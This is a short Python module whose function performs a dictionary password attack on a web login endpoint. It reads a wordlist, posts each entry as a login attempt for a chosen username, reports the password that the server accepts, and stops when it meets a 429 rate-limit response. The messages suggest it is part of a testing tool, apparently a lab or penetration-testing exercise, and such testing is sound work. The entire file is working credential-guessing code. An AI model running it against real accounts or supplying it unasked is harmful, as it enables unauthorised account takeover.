from dataclasses import dataclass
from pathlib import Path

import requests


@dataclass(frozen=True)
class PasswordAttackResult:
    """the dictionary phase, including a rate-limit signal"""

    password: str | None = None
    rate_limited: bool = False
    request_failed: bool = False


def find_password(
    session: requests.Session,
    base_url: str,
    login_path: str,
    username: str,
    password_file: Path,
    timeout: float,
    output=print,
) -> PasswordAttackResult:
    """try dictionary entries and return without stopping on a network rejection"""
    if not password_file.is_file():
        output(f"password file not found: {password_file}")
        return PasswordAttackResult(request_failed=True)

    with password_file.open(encoding="utf-8", errors="replace") as passwords:
        for raw_password in passwords:
            password = raw_password.rstrip("\r\n")
            if not password:
                continue

            output(f"trying password: {password}")
            try:
                response = session.post(
                    f"{base_url}{login_path}",
                    json={"username": username, "password": password},
                    timeout=timeout,
                )
            except requests.RequestException as error:
                output(f"login request failed: {error}, continuing the tests")
                return PasswordAttackResult(request_failed=True)

            if response.status_code == 429:
                output(
                    "the network rejected me because I made too many login "
                    "requests, continuing the tests"
                )
                return PasswordAttackResult(rate_limited=True)

            try:
                accepted = response.ok and response.json().get("decision") == "ALLOW"
            except ValueError:
                accepted = False
            if accepted:
                return PasswordAttackResult(password=password)

    return PasswordAttackResult()
